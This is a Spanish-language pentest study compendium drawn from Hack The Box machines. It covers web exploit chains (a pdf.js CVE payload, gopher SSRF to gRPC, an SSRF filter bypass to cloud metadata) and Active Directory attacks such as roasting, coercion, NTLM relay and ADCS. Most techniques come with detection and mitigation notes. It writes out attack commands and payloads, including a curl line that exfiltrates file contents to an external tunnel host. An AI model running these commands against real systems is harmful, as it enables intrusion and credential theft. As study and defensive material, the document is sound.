# 🧰 ARSENAL — herramientas y técnicas de pentest (HTB + prep de entrevista)

> Compilado para **estudio / CV / prep de entrevista de pentest**. Cada técnica va con *qué es*, *cómo se usa* y su *defensa* (para poder explicarla en pizarra).
> Boxes de referencia: **Resizer** (Hard web), **Nimbus** (Hard cloud/AWS), **ArtificialUniversity** (Insane web, client-side→SSRF→gRPC RCE), **Sandcastle**/**Callfuscated** (Insane pwn/rev), **Blinded** (Insane heap pwn).
> Método reusable en [PLAYBOOK.md](PLAYBOOK.md). Writeups por box: `Resizer.md`, `Nimbus.md`, `ArtificialUniversity.md`, `Sandcastle.md`, `Callfuscated.md`, `WonkyAES.md`, `Blinded_research-notes.md`.
> Referencias madre: HackTricks · PayloadsAllTheThings · hackingthe.cloud · SecLists · GTFOBins/LOLBAS · revshells.com · The Hacker Recipes (AD).

---

## 1. Reconocimiento y enumeración

| Herramienta | Para qué |
|---|---|
| **nmap** | puertos + fingerprint. `-p- --min-rate 3000 -T4 -Pn -n` (rápido) → `-sVC -p<abiertos>` (versión+scripts NSE) |
| **ffuf** / **feroxbuster** / **gobuster** | fuzzing de vhosts, dirs, params. ffuf: `-H "Host: FUZZ.dom" -fs <baseline>` (vhost) · `-u host/FUZZ` (dirs) |
| **curl** | cliente HTTP manual (headers, métodos, SSRF). `-H`, `-X`, `--data-urlencode`, `-w "%{http_code}"` |
| **seclists** | wordlists (`/usr/share/seclists`): `Discovery/DNS/*`, `Discovery/Web-Content/*`, `rockyou.txt` |
| **whatweb / nikto / wappalyzer** | tech-stack y quick wins web |
| **dig / dnsenum / dnsrecon** | DNS: transferencias de zona (`dig axfr @ns dom`), subdominios |

**Orden de oro:** `puertos → vhosts → dirs → params`. El paso **vhosts** es el que costó Nimbus.

---

## 2. Explotación web

| Técnica | Qué es · cómo detectar | Defensa (entrevista) |
|---|---|---|
| **SQLi** | input llega a la query. `' OR 1=1-- -`, UNION, blind/time-based (`sqlmap`) | queries parametrizadas / prepared statements, ORM, mínimo privilegio de DB |
| **SSTI** | template evalúa input (`{{7*7}}`→49). Jinja2/Twig/Freemarker → RCE | no meter input en templates; sandbox; `render` con contexto, no string-format |
| **XXE** | XML parser resuelve entidades externas → leer archivos / SSRF | deshabilitar DTDs/external entities en el parser |
| **Path traversal → write** | `../` escapa el dir. **Resizer**: write arbitrario → shadow `.so` de namespace pkg → RCE | normalizar+validar rutas (`realpath` en jail); no concatenar input a paths |
| **LFI/RFI** | incluir archivos locales/remotos → log poisoning / `php://filter` / RCE | allow-list de includes, no incluir por input |
| **File upload** | subir webshell/bypass de extensión (doble ext, magic bytes, `.phtml`) | validar tipo real, renombrar, servir fuera del webroot |
| **SSRF** | el server pide una URL que elegís → servicios internos, **IMDS cloud** | allow-list de destinos, bloquear IPs internas/link-local (ver §3) |
| **Deserialización** | `yaml.load()`/pickle/Java `readObject`/.NET `BinaryFormatter` instancian objetos → RCE. **Nimbus**: worker `yaml.load(Loader=Loader)` | `safe_load`/allow-list de clases; validación por esquema |
| **JWT** | `alg:none`, secreto débil (crackear con `hashcat -m 16500`), confusión RS/HS | firmar y **verificar** alg; secretos fuertes |
| **Auth bypass / IDOR** | cambiar IDs, forzar roles, mass-assignment | authz por objeto server-side, no confiar en el cliente |

---

## 2b. 🎓 Cadena client-side → SSRF → gRPC RCE (de ArtificialUniversity — Insane web)

> Cadena larga de web moderna: **bug de lógica → bot admin → CVE de cliente → bypass SameSite → SSRF gopher → RCE en microservicio interno**. Cada eslabón es una técnica reusable. Root final.

**1. Auth bug por rama de código.** Un endpoint con dos caminos (`if product_id:` vs `else:`) donde el check de login solo cubría una rama → la otra quedaba **sin auth y con parámetros sensibles controlables** (precio, `user_id`, `email`). *Lección:* auditar la autorización en **cada** rama; los guard-clauses que solo disparan en un branch dejan huecos. *Defensa:* authz centralizada (decorador/middleware), no por-rama.

**2. Bot "admin" que visita una URL construida con tu input.** Un headless browser privilegiado (Selenium/Firefox) logueado como admin visitaba `.../invoice_{payment_id}.pdf`, con `payment_id` controlado por el atacante → **path traversal** (`/../../../admin/x`) para redirigir al bot a **cualquier endpoint same-origin como admin** = CSRF-GET autenticado. *Defensa:* nunca interpolar input en URLs que abre el bot; canonicalizar/validar; el bot no debe navegar a rutas derivadas de input.

**3. CVE-2024-4367 — JS arbitrario vía pdf.js (Firefox < 126).** Un endpoint "view-pdf" fetcheaba una URL y la servía **same-origin como `application/pdf`** → el visor pdf.js del bot renderiza un PDF malicioso cuyo **`/FontMatrix`** contiene un elemento string no saneado que rompe el JS generado en `getPathGenerator` → **ejecución de JS arbitrario en el origen de la app**. PoC: `/FontMatrix [1 0 0 1 0 (0\); <JS> //)]` sobre un PDF con fuente CFF embebida (glifos que fuercen el path generator). *Pista de diseño:* el Dockerfile **pinea Firefox 125.0.1** (fixeado en 126) — ver §"version-pinning". *Defensa:* actualizar pdf.js ≥4.2.67 / Firefox ≥126; no renderizar PDFs no confiables same-origin.

**4. Bypass de SameSite=Lax con form POST top-level.** El JS del CVE corre en un contexto de **origen opaco** (`document.domain='pdf.js'`): un `fetch`/XHR **subresource NO lleva la cookie de sesión** (cookie sin atributo SameSite → Lax por defecto). Pero un **`<form>` POST top-level** (`f.submit()`) **SÍ** la manda (Lax permite cookie en navegación top-level). Clave: apuntar el form al **host interno que usa el bot** (`http://127.0.0.1:1337`), no a la IP externa — la cookie está atada a ese host. *Defensa:* `SameSite=Strict` + **tokens CSRF** en todo endpoint que cambie estado; no exponer acciones sensibles por GET/POST sin token.

**5. curl gopher SSRF → bytes crudos a un puerto interno.** El endpoint admin corría `curl <url>` con la URL controlada → `gopher://127.0.0.1:50051/_<bytes url-encoded>` envía **cualquier byte a cualquier TCP** (clásico SSRF-a-TCP). *Pista de diseño:* el Dockerfile **compila curl 7.70.0 de fuente** — porque curl viejo **manda NULL bytes** en el selector gopher, mientras **curl 8.x los rechaza** (`URL malformed`); los frames HTTP/2 están llenos de `\x00`, así que el pin de versión es esencial. *Defensa:* en fetchers server-side, allow-list de esquemas (solo http/https), bloquear `gopher/dict/file/…`, resolver+validar destino (no internos/link-local).

**6. gopher → gRPC (HTTP/2 a mano).** Para hablarle a un gRPC interno por gopher, se arman los frames h2 crudos: **preface** (`PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n`) + **SETTINGS** vacío + **HEADERS** (HPACK literal: `:method POST`, `:scheme http`, `:path /paquete.Servicio/Metodo`, `:authority host`, `content-type: application/grpc`, `te: trailers`) + **DATA** (mensaje gRPC = 1 byte flag + 4 bytes len big-endian + protobuf). Varios **streams** (id 1,3,5…) para varias llamadas en un tiro. Encoding protobuf de un `map<string,Msg>`: entry con field1=key, field2=value. *Defensa:* gRPC no debe ser alcanzable por SSRF (network policy); mTLS.

**7. "Prototype pollution" en Python → `eval` RCE.** Un RPC "Debug" hacía un **merge recursivo de un dict del atacante en `self.__dict__`** del servicio → permitía **crear atributos arbitrarios** (ej. `price_formula`), y otro RPC hacía `eval(self.price_formula)` → **RCE como root**. Es el análogo Python de prototype pollution (contaminar el objeto vía `__dict__`). *Defensa:* nunca mergear datos no confiables en atributos de objetos; jamás `eval` sobre datos; validar por esquema estricto.

**8. Version-pinning = pista.** Cuando un Dockerfile **compila de fuente una versión vieja** (curl 7.70.0) o **pinea un browser** (Firefox 125.0.1), asumí que el exploit **depende de un comportamiento específico de esa versión** (aquí: nulls en gopher, y el CVE de pdf.js). Es señal, no ruido.

**Metodología de armado (clave para cadenas largas):** aislar **cada eslabón con un beacon observable** (callback a un listener propio) antes de encadenar; exponer el listener al target cloud con **cloudflared** (tunnel HTTPS); y **validar el crafting más frágil (gopher/HTTP2) localmente** contra el mismo servicio (levantar el gRPC del zip) antes de disparar al target. Exfil final: `eval` server-side hace `curl https://TUN/x?f=$(cat /flag*.txt|base64 -w0)` (base64 para chars seguros).

---

## 3. Cloud / AWS (patrón Nimbus — actualizado con lo aprendido EN VIVO)

| Herramienta | Para qué |
|---|---|
| **awscli** | `aws --endpoint-url http://host ...` contra mocks |
| **boto3** | SDK Python; override de `getaddrinfo` para resolver un vhost a la IP + firma SigV4 sola |
| **LocalStack** | emulador AWS (community/pro) típico en boxes cloud; `/{_localstack/health}` lista servicios corriendo |
| **pacu / scoutsuite** | post-explotación/audit de cuentas AWS reales |

**Cadena Nimbus (confirmada en vivo):**
1. **SSRF con bypass de filtro:** el fetcher exigía URL terminada en `.yaml` (bypass: `?z=.yaml`) **y** bloqueaba IPs internas resueltas. **Bypass del bloqueo de IP: codificar la IP en DECIMAL (`2852039166`) u OCTAL (`0251.0376.0251.0376`) = `169.254.169.254`** → el filtro naíve no la reconoce como interna.
2. **SSRF → IMDS:** `/latest/meta-data/iam/security-credentials/<rol>` → **credenciales temporales de IAM** del rol de la instancia.
3. **Usar las creds:** el mock AWS estaba como vhost (`aws.host`); con boto3 directo → SQS → job con **YAML deser** → RCE en el worker (contenedor).
4. **Privesc — el insight clave:** el control de IAM (que rechazaba acciones) estaba en el **proxy nginx**, NO en LocalStack. **LocalStack community edition NO enforcea IAM.** Pegándole **directo al `:4566` interno** (desde el contenedor comprometido) → **todos los servicios sin restricción** (codebuild, iam, secrets...). CodeBuild privilegiado → escape al host → root.

**Checklist con creds robadas:** `sts get-caller-identity` · `sqs list-queues` · `s3 ls` · `secretsmanager list-secrets`+`get-secret-value` · `ssm get-parameters` · `iam list-roles`/`get-role-policy` (AssumeRole a más privilegio) · `lambda list-functions`.

**Trampas de método (de sufrir Nimbus en vivo):**
- **App single-threaded + fetch SSRF sin timeout = self-DoS.** Si el destino del SSRF (IMDS) no responde, el fetch se cuelga y **traba toda la app**. En box recién spawneado, esperar a que el cloud levante (~1-2 min) y tirar **UN** SSRF, nunca rapid-fire.
- **Creds del mock suelen ser estáticas** (mismas en cada spawn) — guardalas y reusalas; no re-leakees en loop.

---

## 4. 🏛️ Active Directory — kill chain completa (ofensiva + Blue Team)

> **El hueco #1 para la chamba.** La mayoría del pentest corporativo real (y casi todo HTB Hard/Insane de Windows) es AD. Esta sección se expandió a un mapa completo: cada técnica ofensiva va con su **gemelo defensivo** (Event ID + MITRE ATT&CK + mitigación) para poder pizarrearla de los dos lados. Todo verificado por un pase adversarial (Event IDs, IDs de ATT&CK y herramientas chequeados uno por uno). **Solo objetivos autorizados** (lab propio / HTB / engagement con permiso).

**Flujo típico:** enum (null/LDAP/BloodHound) → roasting → coerción+relay / ADCS / abuso de ACL → cred access (DCSync) → tickets → lateral → trusts → DA/EA.

#### Enumeración AD y foothold inicial

> **Alcance**: solo objetivos autorizados (lab propio, HTB, o engagement con permiso escrito). Toda técnica de enumeración deja rastro; el gemelo defensivo de cada fila es tan importante como el ataque para quien enseña ambos lados de la pizarra.

**Contexto de detección (leer primero)**
- El **Directory Service Access (4662)** y el **Directory Service Changes** NO se auditan por defecto: hay que habilitar *DS Access* en la Advanced Audit Policy y, para granularidad, poner SACLs en objetos/OUs. Sin eso, gran parte de la enumeración LDAP es invisible.
- Los DC no loguean queries LDAP crudas en el Security log por defecto. La visibilidad fina de LDAP se obtiene con el logging de **Directory Service / Field Engineering** (reg `15 Field Engineering` bajo `NTDS\Diagnostics`) o, moderno, con el **event 1644** (búsqueda LDAP costosa/ineficiente) en el canal Directory Service, más el **proveedor ETW `Microsoft-Windows-LDAP-Client`** que consumen herramientas como SilkETW.
- SMB nulo/anónimo cae en logon **4624 con Logon Type 3** y usuario `ANONYMOUS LOGON`; el acceso a shares/pipes puede generar **5140** (share accedido) y **5145** (chequeo de acceso a nivel objeto) si se audita *File Share* / *Detailed File Share*.

**Técnicas ofensivas y su gemelo defensivo**

| # | Técnica (qué es, 1 línea) | Cómo (herramienta + comando ilustrativo) | Detección (Event ID + qué lo delata) | MITRE | Mitigación |
|---|---|---|---|---|---|
| 1 | **Null / guest SMB session** — sesión sin credenciales contra IPC$ para enumerar. | `rpcclient -U "" -N <DC>` → `enumdomusers` / `querydominfo` | 4624 LT3 con `ANONYMOUS LOGON`; 5140/5145 sobre IPC$ | T1087.002 | `RestrictAnonymous=1`, `RestrictAnonymousSAM=1`; SMB signing; quitar guest |
| 2 | **Anonymous LDAP bind** — bind sin credenciales al DC para leer naming contexts. | `ldapsearch -x -H ldap://<DC> -b "" -s base "*"` (RootDSE) | 1644 / DS-Access 4662 si hay SACL; conexión LDAP sin bind autenticado | T1087.002, T1018 | Deshabilitar anonymous bind (`dsHeuristics`); LDAP signing + channel binding |
| 3 | **Enum "todo-en-uno"** — barrido de users/groups/shares/pol vía RPC+SMB. | `enum4linux-ng -A <DC>` | Ráfaga de 4624 LT3 anónimos + 5140; múltiples pipes SAMR/LSARPC | T1087.002, T1069.002 | igual que #1; alertar volumen de sesiones anónimas |
| 4 | **RID cycling / RID brute** — resolver SIDs→nombres iterando RIDs cuando no hay enum directa. | `nxc smb <DC> -u '' -p '' --rid-brute` | **4661** repetidos sobre objetos SAM_USER (y 4662 si se auditan objetos DS); LSARPC `LsarLookupSids` masivo | T1087.002 | `RestrictAnonymousSAM`; monitorear cadencia de lookups SID |
| 5 | **Enum SMB/LDAP con NetExec** — validar creds y barrer protocolos a escala. | `nxc smb <rango> -u user -p pass --shares` / `nxc ldap <DC> -u u -p p --users` | 4624/4625 en cascada por host; 5140 por share tocado | T1087.002, T1135 | Bloqueo de cuentas; segmentación; detección de spray horizontal |
| 6 | **Shares enumeration** — listar recursos y permisos de lectura/escritura. | `nxc smb <DC> -u u -p p --shares` / `smbclient -L //<DC> -U user` | 5140 (share accedido), 5145 (chequeo de acceso a nivel objeto) con *Detailed File Share* | T1135 | Auditar *File Share*; principio de mínimo privilegio en shares |
| 7 | **Passwords en description/info** — leer atributos LDAP donde se dejan claves. | `ldapsearch -x -H ldap://<DC> -D u@dom -w pass -b "DC=x,DC=y" "(objectClass=user)" description info` (o `windapsearch --custom`) | 4662 con `{Property}` de lectura de `description`/`info` si hay SACL | T1552.001, T1087.002 | Prohibir secretos en atributos; escaneo periódico de `description` |
| 8 | **Password policy** — leer política de bloqueo antes de spray. | `nxc smb <DC> -u u -p p --pass-pol` | Acceso a `domainDNS`/atributos de política; 4661/4662 si auditado | T1201 | (informativo) endurecer política; detectar lecturas anónimas de pol |
| 9 | **User enumeration Kerberos** — validar usuarios por respuesta AS-REQ sin autenticar. | `kerbrute userenum -d dom --dc <DC> users.txt` | **4768** (TGT) — clave: `0x6` (usuario no existe) vs preauth fallido; ráfaga desde una IP | T1087.002 | Alertar volumen de 4768/4771 con status `0x6`/`0x18`; rate-limit KDC |
|10 | **BloodHound collection** — grafo de relaciones/paths de escalada del dominio. | `bloodhound-python -u u -p p -d dom -ns <DC> -c All` (o `nxc ldap <DC> -u u -p p --bloodhound -c all`) | **Volumen anómalo de 4662** sobre muchos objetos en segundos; queries LDAP masivas (1644) | T1087.002, T1069.002, T1482 | DS-Access auditing + detección de ratio de 4662; honeytoken objects |
|11 | **SharpHound (Windows nativo)** — colector .NET desde host unido al dominio. | `SharpHound.exe -c All --zipfilename loot` (solo en host autorizado) | Query LDAP masiva paginada; 4662 en ráfaga; sesiones a ADMIN$/IPC$ en muchos hosts (5140) para session collection | T1087.002, T1018, T1069.002 | ETW/LDAP query logging; alertar barrido de sesiones (NetSessionEnum) |
|12 | **ADIDNS enum/abuse** — leer/crear registros en la zona DNS integrada en AD (wildcard, spoof). | `dnstool.py -u 'dom\u' -p pass --record <name> --action add --data <IP> <DC>` (krbrelayx); alternativas: `bloodyAD ... add dnsRecord` o Powermad `Invoke-DNSUpdate` | Objeto `dnsNode` **creado → 5137** (o **5136** si se modifica) en *Directory Service Changes* | T1557 | Restringir escritura a la zona ADIDNS; monitorear objetos `dnsNode` nuevos |

**Notas de detección transversales**
- **4661** (handle a objeto SAM/DS) y **4662** (operación sobre objeto DS) son la columna vertebral del recon LDAP; requieren SACL para poblarse bien.
- **RID cycling y SharpHound** comparten firma: alto **conteo de 4661/4662 por unidad de tiempo desde un solo principal**. Umbral por tasa > lista negra.
- **Kerbrute** se ve en el KDC: 4768 con `Result Code 0x6` (principal desconocido) en ráfaga = user-enum; 4771 `0x18` (KDC_ERR_PREAUTH_FAILED) = password/preauth fallido (spray).
- **ADIDNS**: crear un registro nuevo genera **5137** (objeto `dnsNode` creado); modificarlo, **5136**. Ambos están en la subcategoría *Directory Service Changes* (hay que habilitarla).
- **Nota MITRE**: el mapeo de passwords en `description`/`info` a **T1552.001** (Credentials In Files) es una convención de la comunidad, no una coincidencia exacta (los atributos de directorio no son ficheros; el padre T1552 sería más literal).
- Colocar **honeytoken accounts/objects** con SACL de lectura convierte cualquier BloodHound/enum en una alerta de alta fidelidad (una lectura de un objeto que nadie legítimo consulta).

---

#### AS-REP Roasting + Kerberoasting (a fondo)

> Ambito: solo objetivos autorizados (lab propio, HTB, engagement con permiso escrito). Ambas tecnicas piden material de tickets al KDC y lo crackean **offline**: no hay lockout, no tocan la cuenta victima. Su firma es la peticion de tickets en RC4 y la posterior fuerza bruta local.

**Flujo Kerberos (minimo indispensable)**

| Paso | Mensaje | Que pasa |
|------|---------|----------|
| 1 | AS-REQ | Cliente pide TGT al KDC. Con pre-auth, adjunta un timestamp cifrado con el hash de su password. |
| 2 | AS-REP | KDC devuelve el TGT. Parte del blob va cifrada con la clave derivada del password del **usuario** -> material crackeable si NO hubo pre-auth. |
| 3 | TGS-REQ | Cliente presenta el TGT y pide un ticket de servicio para un SPN. |
| 4 | TGS-REP | KDC devuelve el ST cifrado con la clave (hash NT) de la **cuenta dueña del SPN** -> material crackeable. |

Idea clave: AS-REP roast ataca el **paso 2** (password de usuarios sin pre-auth); Kerberoasting ataca el **paso 4** (password de cuentas de servicio con SPN). El KDC entrega el material a cualquiera que lo pida en el etype solicitado.

**Encryption types (etype) — leer siempre el campo del evento**

| etype (hex) | Algoritmo | Nota ofensiva/defensiva |
|-------------|-----------|-------------------------|
| 0x17 (23) | RC4-HMAC | Deriva del hash NT, crackeo rapido. Es el etype que se fuerza para roastear. Bandera roja en 4768/4769. |
| 0x12 (18) | AES256-CTS-HMAC-SHA1-96 | Fuerte, crackeo mucho mas lento. |
| 0x11 (17) | AES128-CTS-HMAC-SHA1-96 | Fuerte. |
| 0x1 / 0x3 | DES | Legacy, deshabilitado hoy; su sola aparicion es alerta. |

**Downgrade a RC4:** el atacante pide explicitamente etype 0x17 aunque la cuenta soporte AES. Herramientas modernas (`GetUserSPNs.py`, Rubeus) permiten forzarlo. Mitigacion: `msDS-SupportedEncryptionTypes` en AES-only y detectar RC4 anomalo por usuario.

---

**1) AS-REP Roasting**

- **Que es (1 linea):** extraer y crackear el hash de usuarios que tienen deshabilitada la pre-autenticacion Kerberos (`DONT_REQ_PREAUTH`, UAC bit 0x400000): el KDC entrega el AS-REP crackeable sin autenticar.
- **Como:** `impacket-GetNPUsers dominio/ -usersfile users.txt -no-pass -dc-ip <DC>` (enumera y roastea sin credenciales) o con credenciales lista via LDAP. Crackeo: `hashcat -m 18200 hash.txt wordlist`.
- **Deteccion:** Event **4768** (A Kerberos authentication ticket (TGT) was requested) con **Pre-Authentication Type = 0** y **Ticket Encryption Type = 0x17**. La combinacion "sin pre-auth + RC4" es la firma; correlacionar con origen inusual y volumen.
- **MITRE ATT&CK:** **T1558.004** (Steal or Forge Kerberos Tickets: AS-REP Roasting).
- **Mitigacion:** eliminar `DONT_REQ_PREAUTH` de todas las cuentas (auditar con `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`); passwords largos/complejos; forzar AES; honeypot user sin pre-auth como canario.

**2) Kerberoasting**

- **Que es (1 linea):** cualquier usuario autenticado pide tickets de servicio (TGS) de cuentas con SPN y crackea offline el password de esas cuentas de servicio.
- **Como:** `impacket-GetUserSPNs dominio/user:pass -dc-ip <DC> -request` (o con `-request-user <cuenta>`). Crackeo: `hashcat -m 13100 hash.txt wordlist`. Forzar RC4 si la cuenta tiene AES.
- **Deteccion:** Event **4769** (A Kerberos service ticket was requested) con **Ticket Encryption Type = 0x17**; delator = un mismo principal solicitando muchos SPN distintos en poco tiempo (volumetria: pico de 4769 RC4 por cuenta de origen es anomalo frente a la linea base de estaciones que piden 1-2 servicios habituales).
- **MITRE ATT&CK:** **T1558.003** (Kerberoasting).
- **Mitigacion:** cuentas de servicio con **gMSA/dMSA** (passwords aleatorios de 120+ chars rotados por el sistema); si no, passwords >=25 chars; AES-only en `msDS-SupportedEncryptionTypes`; minimizar SPN sobre cuentas de usuario; honeypot con SPN y password fuerte para alertar en el primer 4769.

**3) Targeted Kerberoasting**

- **Que es (1 linea):** si tenes `GenericWrite`/`GenericAll`/`WriteProperty` sobre una cuenta, le seteas un SPN arbitrario, la roasteas y luego borras el SPN (abuso de ACL para volver roasteable a una cuenta que no tenia SPN).
- **Como:** `Set-ADUser <victima> -ServicePrincipalNames @{Add='fake/svc'}` (o PowerView `Set-DomainObject ... servicePrincipalName`), luego `GetUserSPNs -request-user <victima>` y `hashcat -m 13100`; finalmente **remover** el SPN para tapar rastro.
- **Deteccion:** Event **5136** (A directory service object was modified) sobre el atributo `servicePrincipalName`, y/o Event **4738** (user account was changed); seguido casi inmediato de un **4769** RC4 hacia ese SPN nuevo. La secuencia set-SPN -> TGS -> clear-SPN es el patron delator.
- **MITRE ATT&CK:** **T1558.003** (Kerberoasting), habilitado por manipulacion de la cuenta victima via abuso de ACL (**T1098** — Account Manipulation).
- **Mitigacion:** auditar y reducir ACLs peligrosas (`GenericWrite`/`WriteProperty` sobre usuarios) con BloodHound; SACL sobre `servicePrincipalName`; alertar en escritura de SPN sobre cuentas que normalmente no lo tienen; principio de menor privilegio en delegaciones.

**Notas defensivas transversales**

| Control | Efecto |
|---------|--------|
| AES-only (`msDS-SupportedEncryptionTypes`) | Encarece el crackeo y hace del 0x17 una alerta pura. |
| gMSA/dMSA para servicios | Passwords no crackeables en la practica; mata Kerberoasting sobre esas cuentas. |
| Baseline de 4768/4769 por host | Convierte la volumetria RC4 y los picos de SPN en deteccion accionable. |
| Honeypots (user sin pre-auth / cuenta con SPN) | Cualquier 4768/4769 hacia ellos = intrusion, casi sin falsos positivos. |
| Quitar `DONT_REQ_PREAUTH` | Elimina de raiz el vector AS-REP. |

---

#### Coerción de autenticación + NTLM relay

> **Alcance:** solo objetivos autorizados (lab propio / HTB / engagement con permiso escrito). Estas técnicas fuerzan autenticación de máquinas/DCs y la reenvían: en producción sin permiso es intrusión.

**Idea base:** NTLM no ata la autenticación al canal ni al servicio. Si consigo que una víctima (idealmente una **cuenta de máquina**, p.ej. el DC$) me autentique por NTLM, puedo **reenviar** (relay) esa auth a otro servicio donde la víctima tenga privilegios. La *coerción* es el gatillo que obliga a la víctima a autenticarse contra mí; el *relay* es el abuso.

---

##### 1) Obtención del material NTLM (poisoning / MITM)

| Técnica | Qué es (1 línea) | Cómo (comando ilustrativo) | Detección (qué lo delata) | ATT&CK | Mitigación |
|---|---|---|---|---|---|
| **Responder** | Envenena LLMNR/NBT-NS/mDNS: responde a resolución de nombres fallida y captura NetNTLM. | `responder -I eth0` | **No hay Event ID nativo de Security que marque el poisoning**; se detecta por red (host atacante respondiendo a nombres inexistentes), honeytoken/honeypot LLMNR y picos de UDP **5355** (LLMNR)/**137** (NBT-NS). NetNTLMv1/v2 capturado por poisoning es offline: no deja 4624. | T1557.001 | Deshabilitar LLMNR (GPO *Turn off multicast name resolution*, `EnableMulticast=0`) y NBT-NS (DHCP opt/registry); segmentar; NetBIOS off. |
| **mitm6** | Se hace pasar por servidor **DHCPv6** (IPv6 preferido por Windows) + WPAD malicioso → fuerza auth WPAD/proxy. | `mitm6 -d dominio.local` (junto con `ntlmrelayx`) | **Sysmon 22** (DNSQuery a `wpad`); DHCPv6 no autorizado; aparición de un DNS/gateway IPv6 inesperado; 4624 tipo 3 tras el relay. | T1557.001 | Deshabilitar IPv6 si no se usa, o RA Guard/DHCPv6 Guard en switches; WPAD por GPO/host `wpad` sinkhole; Autoproxy off. |

---

##### 2) Coerción de autenticación (forzar que la víctima se autentique)

| Técnica | Protocolo / método | Cómo (comando ilustrativo) | Detección | ATT&CK | Mitigación |
|---|---|---|---|---|---|
| **PetitPotam** | MS-EFSRPC (`EfsRpcOpenFileRaw` y variantes) sobre `\pipe\lsarpc`/`efsrpc`. | `petitpotam.py <listener> <target-DC>` | **5145** (detailed file share) sobre pipe `lsarpc`/`efsrpc`; **4624** tipo 3 desde host inesperado como `DC$`. | T1187 | KB5005413 / parches EFSRPC; **EPA (Extended Protection for Authentication)**; RPC filters bloqueando MS-EFSRPC; forzar SMB/LDAP signing. |
| **PrinterBug / SpoolSample** | MS-RPRN (`RpcRemoteFindFirstPrinterChangeNotification(Ex)`) fuerza al Spooler a autenticarse. | `printerbug.py dom/user:pass@<DC> <listener>` | **5145** sobre pipe `spoolss`; **4624** tipo 3 desde `DC$`; **Sysmon 3** (conexión saliente del proceso spooler). | T1187 | **Deshabilitar Print Spooler en DCs** (y servidores tier-0); RPC filters MS-RPRN; signing. |
| **DFSCoerce** | MS-DFSNM (`NetrDfsAddStdRoot`/`NetrDfsRemoveStdRoot`) sobre pipe `netdfs`. | `dfscoerce.py -u user -p pass <listener> <DC>` | **5145** sobre pipe `netdfs`; **4624** tipo 3 desde `DC$`. | T1187 | RPC filters MS-DFSNM; restringir DFS management; signing/EPA. |
| **ShadowCoerce** | MS-FSRVP (VSS, `IsPathSupported`/`IsPathShadowCopied`) fuerza auth. | `shadowcoerce.py -u user -p pass <listener> <DC>` | **5145** sobre pipe `FssagentRpc`; 4624 tipo 3 anómalo. | T1187 | Parches MS-FSRVP; deshabilitar servicio VSS/FSRVP donde no se use; RPC filters. |
| **Coercer** | Multi-método: automatiza EFSRPC/RPRN/DFSNM/FSRVP y más en un solo barrido. | `coercer coerce -u user -p pass -t <DC> -l <listener>` | Ráfaga de **5145** sobre múltiples pipes en segundos; 4624 tipo 3 desde `DC$`; correlación multi-pipe = firma fuerte. | T1187 | Suma de todas las anteriores; alertar sobre correlación multi-pipe. |

---

##### 3) Cadenas de ataque (coerción → relay → escalada)

| Cadena | Flujo | Resultado | Detección clave |
|---|---|---|---|
| **Relay a LDAP(S) → RBCD** | Coerce DC → relay a LDAP → escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` con SID de máquina controlada → S4U2Self/Proxy. | Impersonar cualquier user (incl. admin) en el DC. | 4624 tipo 3 en LDAP host + **5136** (modificación de atributo de directorio) sobre `msDS-AllowedToActOnBehalfOfOtherIdentity`. |
| **Relay a LDAP → Shadow Credentials** | Coerce DC → relay a LDAP → escribir `msDS-KeyCredentialLink` → PKINIT con cert propio. | TGT / NT hash del DC vía UnPAC-the-hash. | 4624 tipo 3 en LDAP + **5136** sobre `msDS-KeyCredentialLink`. |
| **Relay a ADCS ESC8** | Coerce DC → relay a **Web Enrollment** (HTTP `/certsrv`) → pedir cert como `DC$` (plantilla *Machine/DomainController*). | Cert del DC → auth PKINIT → DCSync. | 4624 tipo 3 en el servidor CA/IIS; **4886/4887** (Cert Services request/issue) para plantilla de máquina desde origen anómalo. |

Herramienta de relay: `ntlmrelayx.py` (impacket). Ilustrativo — LDAPS + RBCD:
`ntlmrelayx.py -t ldaps://<DC> --delegate-access` · ESC8: `ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController`

---

##### 4) Detección transversal (blue team)

| Señal | Dónde | Qué buscar |
|---|---|---|
| **4624 tipo 3** | Security del servidor destino (LDAP/CA/SMB) | Logon de red de una **cuenta de máquina** (`*$`) desde una IP/host que no es esa máquina → relay casi seguro. |
| **5145** | Security del DC (requiere *Audit Detailed File Share*) | Acceso a pipes `spoolss`, `efsrpc`/`lsarpc`, `netdfs`, `FssagentRpc` = coerción. |
| **5136** | Security del DC (*Audit Directory Service Changes*) | Escritura de `msDS-AllowedToActOnBehalfOfOtherIdentity` o `msDS-KeyCredentialLink`. |
| **Sysmon 3** | Endpoint | Conexión de red saliente de `spoolsv.exe`/`lsass` hacia host no-DC. |
| **Sysmon 22** | Endpoint | DNSQuery a `wpad` (mitm6). |
| **4886 / 4887** | CA | Solicitud/emisión de certificado para plantilla de máquina desde origen inesperado (ESC8). |

##### 5) Mitigaciones estructurales (cierran la familia entera)

- **LDAP signing + channel binding (EPA)** en DCs (`LDAPServerIntegrity=2`, *Domain controller: LDAP server channel binding token requirements = Always*) → mata el relay a LDAP/LDAPS.
- **SMB signing obligatorio** (cliente y servidor) → mata el relay a SMB.
- **EPA en ADCS Web Enrollment** + deshabilitar HTTP/NTLM en `/certsrv` → cierra ESC8.
- **Deshabilitar Print Spooler** en DCs y tier-0; aplicar **parches de coerción** (KB5005413 y posteriores) y **RPC filters** para MS-EFSRPC/MS-RPRN/MS-DFSNM/MS-FSRVP.
- **Reducir/eliminar NTLM** (política *Restrict NTLM*), deshabilitar LLMNR/NBT-NS/mDNS e IPv6 no usado.

**ATT&CK del dominio:** T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay), T1187 (Forced Authentication).

---

#### ADCS — Active Directory Certificate Services (Certipy, ESC1-ESC14)

> **Alcance:** SOLO objetivos autorizados (lab propio / HTB / engagement con permiso escrito). ADCS es una vía directa a Domain Admin: un cert de cliente válido = autenticación como cualquier usuario, y persiste aunque se cambie la contraseña. MITRE ATT&CK global del dominio: **T1649 — Steal or Forge Authentication Certificates**.

**Idea central (pizarra):** una plantilla de certificado que permita *autenticación de cliente* + que el solicitante controle el *subject* (SAN/UPN) + que un usuario de bajo privilegio pueda *enrolar* = suplantación de identidad. Todos los ESC son variaciones de romper uno de esos tres candados.

**Enumeración (siempre primero):**
`certipy find -u user@dom -p 'pass' -dc-ip 10.0.0.1 -vulnerable -stdout`
